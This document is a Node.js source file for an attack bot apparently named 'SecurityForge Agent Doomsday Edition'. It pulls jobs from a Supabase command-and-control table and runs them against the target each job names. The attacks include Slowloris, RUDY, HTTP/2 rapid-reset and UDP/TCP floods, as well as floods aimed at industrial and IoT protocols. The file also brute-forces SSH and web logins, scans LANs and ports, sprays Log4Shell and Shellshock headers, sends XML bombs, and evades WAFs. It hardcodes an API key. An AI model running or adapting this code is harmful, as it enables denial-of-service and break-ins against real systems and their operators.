/**
 * SECURITYFORGE AGENT V40.1 (DOOMSDAY EDITION) - FULL KERNEL
 * 
 * [CAPABILITIES]
 * - L7: HTTP/1.1 (Axios), HTTP/2 (Native), Slowloris, RUDY, GraphQL
 * - L4: TCP Connect Flood, UDP Fragmentation, UDP Flood
 * - PROTOCOLS: QUIC, DNS, SIP, MQTT, RTSP, COAP, MODBUS, ADB, GHOST
 * - AUTH: Login Siege, SSL Handshake Storm, SSH/SMTP Hydra
 * - RECON: OSINT, LAN Scanner, Port Scanner
 */

const axios = require('axios');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');

// ==========================================
// CONFIGURATION
// ==========================================
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// ==========================================
// ASSETS & DICTIONARIES
// ==========================================
const COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443];
const LOGIN_PATHS = ['/login', '/signin', '/auth', '/api/login', '/user/login', '/admin', '/administrator', '/wp-login.php'];
const BASE_PASSWORDS = [
    '123456', 'password', 'admin', 'root', '12345678', 'qwerty', 
    'admin123', 'guest', 'user', '111111', 'pass123', 'toor',
    'changeme', 'service', 'deploy', 'welcome'
];

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Discordbot/2.0; +https://discordapp.com"
];

const MALICIOUS_PAYLOADS = {
  SQL_INJECTION: `{"query": "UNION SELECT 1, SLEEP(20), 3, 4 --", "id": "1' OR '1'='1"}`,
  XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
  LARGE_BUFFER: Buffer.alloc(10 * 1024 * 1024, 'A'), // 10MB
  SIP_INVITE: (ip, targetNumber) => {
      const branch = 'z9hG4bK-' + Math.random().toString(36).substring(7);
      const tag = Math.random().toString(36).substring(7);
      const callId = Math.random().toString(36).substring(7) + '@securityforge.io';
      return `INVITE sip:${targetNumber || 'stress'}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${targetNumber || 'stress'}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n`;
  }
};

const RCE_HEADERS = {
    'X-Api-Version': '${jndi:ldap://127.0.0.1:1389/a}',
    'X-Forwarded-For': '${jndi:dns://127.0.0.1:53/a}',
    'User-Agent': '() { :;}; /bin/bash -c "sleep 10"'
};

// ==========================================
// SYSTEM SERVER
// ==========================================
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V40.1 (Doomsday)'); }).listen(PORT, () => console.log(`[SYSTEM] Listening on ${PORT}`));

process.on('uncaughtException', (e) => { /* ignore */ });
process.on('unhandledRejection', (e) => { /* ignore */ });

// ==========================================
// HTTP CLIENT (AXIOS)
// ==========================================
const httpsAgent = new https.Agent({ keepAlive: true, keepAliveMsecs: 60000, maxSockets: Infinity, rejectUnauthorized: false });
const httpAgent = new http.Agent({ keepAlive: true, keepAliveMsecs: 60000, maxSockets: Infinity });
const client = axios.create({ timeout: 15000, validateStatus: () => true, httpAgent, httpsAgent, maxRedirects: 3 });

const supabaseRequest = async (method, pathStr, body = null) => {
    try {
        const res = await client({
            method, url: `${SUPABASE_URL}/rest/v1/${pathStr.replace(/^\//, '')}`,
            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json', 'Prefer': 'return=representation' },
            data: body
        });
        return res.data;
    } catch(e) { return null; }
};

console.log('\x1b[36m[AGENT] Initialized V40.1 (Doomsday). Waiting for jobs...\x1b[0m');

// ==========================================
// ATTACK LOGIC
// ==========================================
let activeJob = null;
let activeLoop = null;
let pulseLoop = null;
let logBuffer = [];
let priorityBuffer = [];
let discoveredHosts = [];

const logToC2 = (msg) => {
    console.log(msg);
    const cleanMsg = msg.replace(/\x1b\[[0-9;]*m/g, '');
    if (cleanMsg.includes('FOUND') || cleanMsg.includes('OPEN') || cleanMsg.includes('SUCCESS') || cleanMsg.includes('CRACKED')) priorityBuffer.push(cleanMsg);
    else logBuffer.push(cleanMsg);
};

const getHost = (t) => t.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    const duration = job.duration > 0 ? job.duration : 60;
    const startTime = Date.now();
    logBuffer = []; priorityBuffer = []; discoveredHosts = [];
    
    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Threads: ${job.concurrency} | V40.1 DOOMSDAY`);

    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    let pulseActive = true;

    if (job.use_pulse) pulseLoop = setInterval(() => { pulseActive = !pulseActive; }, 2000);

    const getTargetHost = () => {
        if (discoveredHosts.length > 0 && Math.random() > 0.7) {
            return discoveredHosts[Math.floor(Math.random() * discoveredHosts.length)];
        }
        return getHost(job.target);
    };

    // =========================================================================
    // 1. INFRASTRUCTURE & RECON (Acid Rain, Port Scan, Hydra)
    // =========================================================================
    const runLanScan = () => {
        if (!running) return;
        const baseIp = getHost(job.target).split('.').slice(0,3).join('.');
        if (baseIp.split('.').length !== 3) return;
        
        for(let i=1; i<255; i++) {
            const ip = `${baseIp}.${i}`;
            const s = new net.Socket(); s.setTimeout(300);
            s.on('connect', () => { if(!discoveredHosts.includes(ip)) { discoveredHosts.push(ip); logToC2(`[FOUND] HOST: ${ip}`); } s.destroy(); });
            s.on('error', () => s.destroy());
            s.on('timeout', () => s.destroy());
            s.connect(80, ip);
        }
        setTimeout(() => { if(running) runLanScan(); }, 15000);
    };

    const runPortScan = () => {
        if (!running) return;
        const target = getHost(job.target);
        const port = COMMON_PORTS[Math.floor(Math.random() * COMMON_PORTS.length)];
        const s = new net.Socket(); s.setTimeout(1000);
        s.on('connect', () => { logToC2(`[OPEN] Port ${port} on ${target}`); s.destroy(); });
        s.on('error', () => s.destroy());
        s.connect(port, target);
        setTimeout(() => { if(running) runPortScan(); }, 500);
    };

    const runInfraAttack = (port, type) => {
        if (!running) return;
        const target = getTargetHost();
        const socket = new net.Socket(); socket.setTimeout(5000);
        
        socket.connect(port, target, () => {
            jobSuccess++;
            if (type === 'SSH') {
                socket.write('SSH-2.0-OpenSSH_8.9p1\r\n');
                setTimeout(() => socket.write(`${BASE_PASSWORDS[Math.floor(Math.random()*BASE_PASSWORDS.length)]}\n`), 500);
            } else if (type === 'SMTP') {
                socket.write(`EHLO securityforge.io\r\n`);
                setInterval(() => { if(running && !socket.destroyed) socket.write(`RSET\r\n`); }, 500);
            } else if (type === 'DB') {
                setInterval(() => { if(running && !socket.destroyed) socket.write(Buffer.from([0x00])); }, 2000);
            }
        });
        socket.on('data', (d) => { if (type === 'SSH' && d.toString().includes('password')) logToC2(`[SSH] Banner from ${target}`); });
        socket.on('error', () => { jobFailed++; socket.destroy(); });
        socket.on('timeout', () => socket.destroy());
        socket.on('close', () => { totalRequests++; if(running) setImmediate(() => runInfraAttack(port, type)); });
    };

    // =========================================================================
    // 2. NETWORK FLOODS (L4 NetJam, IoT)
    // =========================================================================
    const runTcpFlood = () => {
        // SYN Flood Simulation (Connect Flood)
        if (!running) return;
        const target = getTargetHost();
        const port = job.target.includes('https') ? 443 : 80;
        const s = new net.Socket(); s.setTimeout(1000);
        s.connect(port, target, () => { jobSuccess++; s.destroy(); }); // Immediate disconnect
        s.on('error', () => { jobFailed++; s.destroy(); });
        s.on('close', () => { totalRequests++; if(running) setImmediate(runTcpFlood); });
    };

    const runUdpVector = (port, type) => {
        if (!running) return;
        const target = getTargetHost();
        
        // TCP Handlers
        if (['GHOST','ADB','MODBUS','MQTT','RTSP'].includes(type)) {
            const s = new net.Socket(); s.setTimeout(2000);
            s.connect(port, target, () => {
                if (type === 'GHOST') s.write(job.ghost_message || 'HACKED');
                if (type === 'ADB') s.write(Buffer.from('434e584e00000001001000000700000030000000bc0b0000', 'hex'));
                if (type === 'MODBUS') s.write(Buffer.from('00000000000601030000000a', 'hex'));
                jobSuccess++; s.destroy();
            });
            s.on('error', () => s.destroy());
            s.on('close', () => { totalRequests++; if(running) setImmediate(() => runUdpVector(port, type)); });
            return;
        }

        // UDP Handlers
        const client = dgram.createSocket('udp4');
        let payload = Buffer.alloc(1024, 'X');
        if (type === 'FRAG') payload = Buffer.alloc(65000, 'F'); // Max MTU Attempt
        if (type === 'SIP') payload = Buffer.from(MALICIOUS_PAYLOADS.SIP_INVITE(target, job.ghost_message));
        if (type === 'DNS') payload = crypto.randomBytes(64);
        if (type === 'QUIC') payload = crypto.randomBytes(1200);

        client.send(payload, port, target, (err) => {
            if (err) jobFailed++; else jobSuccess++;
            try { client.close(); } catch(e){}
            totalRequests++;
            if (running) setImmediate(() => runUdpVector(port, type));
        });
    };

    // =========================================================================
    // 3. ADVANCED HTTP VECTORS (HTTP2, SSL, Slowloris, Auth)
    // =========================================================================
    const runHttp2 = () => {
        if (!running) return;
        const target = job.target;
        const session = http2.connect(target);
        
        session.on('error', () => { jobFailed++; session.destroy(); if(running) runHttp2(); });
        
        const doRequest = () => {
            if(!running || session.destroyed) return;
            const req = session.request({ ':path': '/' });
            req.on('response', () => { jobSuccess++; });
            req.on('end', () => { totalRequests++; if(job.use_god_mode) req.close(); }); // Rapid Reset: close immediately
            if (!job.use_god_mode) req.on('data', () => {}); // Consume if not god mode
            req.end();
            if(running) setImmediate(doRequest);
        };
        for(let i=0; i<10; i++) doRequest();
    };

    const runSslStorm = () => {
        if (!running) return;
        const target = getHost(job.target);
        const socket = tls.connect(443, target, { rejectUnauthorized: false }, () => {
            jobSuccess++; socket.destroy(); // Handshake and kill
        });
        socket.on('error', () => { jobFailed++; socket.destroy(); });
        socket.on('close', () => { totalRequests++; if(running) setImmediate(runSslStorm); });
    };

    const runMagma = () => { // Slowloris
        if (!running) return;
        const target = getHost(job.target);
        const port = job.target.includes('https') ? 443 : 80;
        const lib = job.target.includes('https') ? tls : net;
        
        const socket = lib.connect(port, target, () => {
            socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${USER_AGENTS[0]}\r\nContent-Length: 42\r\n`);
            const i = setInterval(() => {
                if (running && !socket.destroyed) {
                    socket.write("X-a: b\r\n"); // Keep-alive header
                    jobSuccess++;
                } else clearInterval(i);
            }, 5000); // Very slow
        });
        socket.on('error', () => { jobFailed++; socket.destroy(); });
    };

    const runRudy = () => { // R.U.D.Y.
        if (!running) return;
        const target = getHost(job.target);
        const port = job.target.includes('https') ? 443 : 80;
        const lib = job.target.includes('https') ? tls : net;
        
        const socket = lib.connect(port, target, () => {
            socket.write(`POST / HTTP/1.1\r\nHost: ${target}\r\nContent-Length: 100000\r\n\r\n`);
            const i = setInterval(() => {
                if (running && !socket.destroyed) {
                    socket.write("A"); // 1 byte at a time
                    jobSuccess++;
                } else clearInterval(i);
            }, 5000);
        });
        socket.on('error', () => { jobFailed++; socket.destroy(); });
    };

    const runLoginSiege = async () => {
        if (!running) return;
        const target = job.target; // Assumes base URL
        const path = LOGIN_PATHS[Math.floor(Math.random() * LOGIN_PATHS.length)];
        const user = 'admin';
        const pass = BASE_PASSWORDS[Math.floor(Math.random() * BASE_PASSWORDS.length)];
        
        try {
            await client.post(`${target}${path}`, { username: user, password: pass });
            jobSuccess++;
        } catch(e) { jobFailed++; }
        totalRequests++;
        if (running) setImmediate(runLoginSiege);
    };

    const runAxiosFlood = async () => {
        if (!running) return;
        if (job.use_pulse && !pulseActive) { setTimeout(runAxiosFlood, 200); return; }
        
        let url = job.target;
        let method = job.method || 'GET';
        let body = job.body;
        let headers = { 
            'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
            ...(typeof job.headers === 'object' ? job.headers : JSON.parse(job.headers || '{}'))
        };

        if (job.use_bandwidth_saturation) { method = 'POST'; body = MALICIOUS_PAYLOADS.LARGE_BUFFER; }
        if (job.use_rce_spray) Object.assign(headers, RCE_HEADERS);
        if (job.use_webhook_flood) { method = 'POST'; body = { content: job.ghost_message || '@everyone SECURITY AUDIT', username: 'SecurityForge' }; }
        if (job.use_xml_bomb) { method = 'POST'; body = MALICIOUS_PAYLOADS.XML_BOMB; }
        
        const rotateIdentity = () => {
            headers['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
            headers['X-Forwarded-For'] = crypto.randomBytes(4).join('.');
        };

        const start = Date.now();
        try {
            const res = await client({ method, url, headers, data: body });
            jobLatencySum += (Date.now() - start); jobReqsForLatency++;
            jobSuccess++;
            if (job.use_waf_breaker && (res.status === 403 || res.status === 429)) rotateIdentity();
        } catch(e) {
            jobFailed++;
            if (job.use_waf_breaker) rotateIdentity();
        }
        totalRequests++;
        if (running) setImmediate(runAxiosFlood);
    };

    // =========================================================================
    // THREAD SPAWNER - FULL MAPPING
    // =========================================================================
    const THREADS = Math.min(job.concurrency || 50, 1000);
    
    if (job.use_lan_scan) runLanScan();
    if (job.use_port_scan) runPortScan();

    for(let i=0; i<THREADS; i++) {
        // L4 / UDP
        if (job.use_syn_flood) runTcpFlood();
        else if (job.use_frag_attack) runUdpVector(80, 'FRAG');
        else if (job.use_http3_flood) runUdpVector(443, 'QUIC');
        else if (job.use_dns_reaper) runUdpVector(53, 'DNS');
        else if (job.use_sip_flood) runUdpVector(5060, 'SIP');
        else if (job.use_adb_swarm) runUdpVector(5555, 'ADB');
        else if (job.use_ghost_writer) runUdpVector(9100, 'GHOST');
        else if (job.use_modbus_storm) runUdpVector(502, 'MODBUS');
        else if (job.use_mqtt_flood) runUdpVector(1883, 'MQTT');
        else if (job.use_rtsp_storm) runUdpVector(554, 'RTSP');
        else if (job.use_coap_burst) runUdpVector(5683, 'UDP');

        // Infra / Auth
        else if (job.use_acid_rain) runInfraAttack(3306, 'DB');
        else if (job.use_smtp_storm) runInfraAttack(25, 'SMTP');
        else if (job.use_ssh_hydra) runInfraAttack(22, 'SSH');
        else if (job.use_login_siege) runLoginSiege();
        else if (job.use_ssl_storm) runSslStorm();

        // Advanced HTTP
        else if (job.use_http2 || job.use_god_mode) runHttp2();
        else if (job.use_magma) runMagma();
        else if (job.use_rudy) runRudy();
        else if (job.use_leech) runLeech();
        else if (job.use_admin_hunter || (job.use_osint_recon && i < 5)) runLoginSiege(); // Re-use login siege logic for admin hunting

        // Standard
        else runAxiosFlood();
    }

    // =========================================================================
    // REPORTING LOOP
    // =========================================================================
    const updateC2 = async () => {
        if (!running) return;
        const elapsed = (Date.now() - startTime) / 1000;
        
        if (duration > 0 && elapsed >= duration) {
            running = false; clearInterval(activeLoop); clearInterval(pulseLoop);
            await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'COMPLETED', total_success: jobSuccess, total_failed: jobFailed });
            activeJob = null; return;
        }

        const rps = elapsed > 0 ? totalRequests / elapsed : 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        const logsToSend = priorityBuffer.length > 0 ? JSON.stringify(priorityBuffer) : null;
        priorityBuffer = [];

        const res = await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
            current_rps: Math.round(rps), total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat,
            ...(logsToSend ? { logs: logsToSend } : {})
        });

        if (res && res[0] && res[0].status === 'STOPPED') {
            running = false; clearInterval(activeLoop); clearInterval(pulseLoop);
            activeJob = null;
        }
    };
    activeLoop = setInterval(updateC2, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    const jobs = await supabaseRequest('GET', 'jobs?status=eq.PENDING&order=created_at.desc&limit=1&select=*');
    if (jobs && jobs.length > 0) {
        const job = jobs[0];
        try { job.headers = JSON.parse(job.headers); } catch(e) { job.headers = {}; }
        await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
        startAttack(job);
    }
}, 1000);
